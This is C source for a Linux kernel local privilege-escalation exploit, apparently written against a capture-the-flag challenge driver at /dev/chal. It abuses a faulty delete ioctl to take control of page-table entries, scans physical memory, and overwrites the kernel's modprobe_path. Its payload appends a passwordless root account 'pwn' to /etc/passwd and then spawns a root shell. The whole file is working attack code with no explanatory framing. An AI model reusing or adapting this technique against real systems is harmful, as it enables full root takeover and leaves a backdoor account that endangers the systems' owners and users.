#include "exploit.h"

/*********** commands ******************/
#define DEV_PATH "/dev/chal"   // the path the device is placed

#define CMD_ADD_OBJ 0x1000
#define CMD_DEL_OBJ 0x1001
#define CMD_SUPER_DEL_OBJ 0x1002
/*********** constants ******************/
#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
    fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
    exit(1); \
    } \
    __res; \
    })

#define PTE2V(i) ((unsigned long long)(i) << 12)
#define PMD2V(i) ((unsigned long long)(i) << 21)
#define PUD2V(i) ((unsigned long long)(i) << 30)
#define PGD2V(i) ((unsigned long long)(i) << 39)

#define V2PTE(i) (((unsigned long long)(i) >> 12) & 0x1ff)
#define V2PMD(i) (((unsigned long long)(i) >> 21) & 0x1ff)
#define V2PUD(i) (((unsigned long long)(i) >> 30) & 0x1ff)
#define V2PGD(i) (((unsigned long long)(i) >> 39) & 0x1ff)

#define PHYS_ENTRY(i) (((unsigned long long)(i) << 12) | 0x8000000000000067)
#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, byte_index) \
  ((void*)(PGD2V((unsigned long long)(pgd_index)) + PUD2V((unsigned long long)(pud_index)) + \
    PMD2V((unsigned long long)(pmd_index)) + PTE2V((unsigned long long)(pte_index)) + (unsigned long long)(byte_index)))
#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

#define N_DRAIN_PTE 0x200
#define N_DRAIN_PMD 0x10
#define DEBUG (0)
#define STEP(...) do { if (DEBUG) { printf(__VA_ARGS__); getc(stdin); }} while (0)
#define MODPROBE_NEW "/tmp/mod"
#define TRIGGER_PATH "/tmp/xd"
#define EXP_CODE "#!/bin/sh\necho pwn::0:0:root:/root:/bin/sh>>/etc/passwd"

#define FLUSH_STAT_INPROGRESS (0x1234)
#define FLUSH_STAT_DONE (0x1245)
int chal_fd;
// (END globals)

static void flush_tlb()
{
  short *status;
  void *addr;
  int len = 0x1000;

  status = SYSCHK(mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0));
  addr = SYSCHK(mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0));

  *status = FLUSH_STAT_INPROGRESS;
  if (SYSCHK(fork()) == 0)
  {
    SYSCHK(munmap(addr, len));
    *status = FLUSH_STAT_DONE;
    sleep(9999);
  }

  SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

  munmap(status, sizeof(short));
}

int main(int argc, char *argv[]) {
  void *ptrs[N_DRAIN_PTE], *qtrs[N_DRAIN_PMD], *sbin_ptr, *target;
  long long *victim = 0, *attack = 0, phys;
  int exp_fd, xd_fd;
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(0, &cpuset);
  SYSCHK(sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
  chal_fd = SYSCHK(open(DEV_PATH, O_RDWR));
  for (int i = 0; i < N_DRAIN_PTE; i++) {
    ptrs[i] = SYSCHK(mmap(0, 0x1000 * 0x200, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0));
  }
  for (int i = 0; i < N_DRAIN_PMD; i++) {
    qtrs[i] = SYSCHK(mmap(PTI_TO_VIRT(0xbe, i * (0x200 / N_DRAIN_PMD), 0, 0, 0), 0x1000 * 0x200, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0));
  }
  // alloc pgd and pud in advance
  *(long long*)qtrs[0] = 0;
  SYSCHK(ioctl(chal_fd, CMD_ADD_OBJ, 0x10000));
  SYSCHK(ioctl(chal_fd, CMD_DEL_OBJ, 0));

  for (int i = 0;i < N_DRAIN_PTE; i++) {
    STEP("%p == 0\n", ptrs[i]);
    *(long*)ptrs[i]  = 0;
  }

  // VULN
  SYSCHK(ioctl(chal_fd, CMD_SUPER_DEL_OBJ, 0));
  // VULN

  for (int i = 1; i < N_DRAIN_PMD; i++) {
    STEP("%p == 0\nPGD:%d PUD: %d PMD: %d PTE: %d\n", qtrs[i], V2PGD(qtrs[i]), V2PUD(qtrs[i]), V2PMD(qtrs[i]), V2PTE(qtrs[i]));
    *(long*)qtrs[i] = 0;
  }
  for (int j = 1; j < N_DRAIN_PMD; j++) {
    *(long*)qtrs[j] = 0xcafe;
    for (int i = 1; i < N_DRAIN_PTE; i++) {
      attack = (long*)PTI_TO_VIRT(V2PGD(ptrs[i]), V2PUD(ptrs[i]), V2PMD(ptrs[i]), 0, 0);
      STEP("attack: %p\n", attack);
      if (*attack) {
        victim = (long long*)qtrs[j];
        printf("Attack: %p (%llx)\nVictim: %p (%llx)\n", attack, *attack, victim, *victim);
        break;
      }
    }

    if (attack) break;
  }

  phys = 0;

  while (1) {
    for (int i = 0; i < 0x200; i++) {
      attack[i] = PHYS_ENTRY(phys++);
    }

    flush_tlb();

    for (int i = 0; i < 0x200; i++) {
      target = (void *)((long)victim + 0x1000 * i);
      fflush(stdout);
      if ((sbin_ptr = memmem(target, 0x1000, "/sbin/mo", 8)) && !memcmp((unsigned long)sbin_ptr+8, "dprobe\0", 7)) {
        printf("Overwriting %s\n", sbin_ptr);
        memcpy(sbin_ptr, MODPROBE_NEW , strlen(MODPROBE_NEW)+1);
        goto win;
      }
    }
  }

win:
  exp_fd = SYSCHK(open(MODPROBE_NEW, O_RDWR | O_CREAT, 0777));
  SYSCHK(write(exp_fd, EXP_CODE, strlen(EXP_CODE)));
  SYSCHK(close(exp_fd));
  xd_fd = SYSCHK(open(TRIGGER_PATH, O_RDWR | O_CREAT, 0777));
  SYSCHK(write(xd_fd, "\xdd\xdd", 2));
  SYSCHK(close(xd_fd));

  char *su_argv[] = {"su", "-", "pwn"};
  puts("[*] Win!");
  execve(TRIGGER_PATH, NULL, NULL);
  SYSCHK(execve("/bin/su", &su_argv, NULL));
  SYSCHK(execve("/bin/sh", NULL, NULL));


  // end of life
  puts("[ ] END of life...");
  sleep(999999);
}
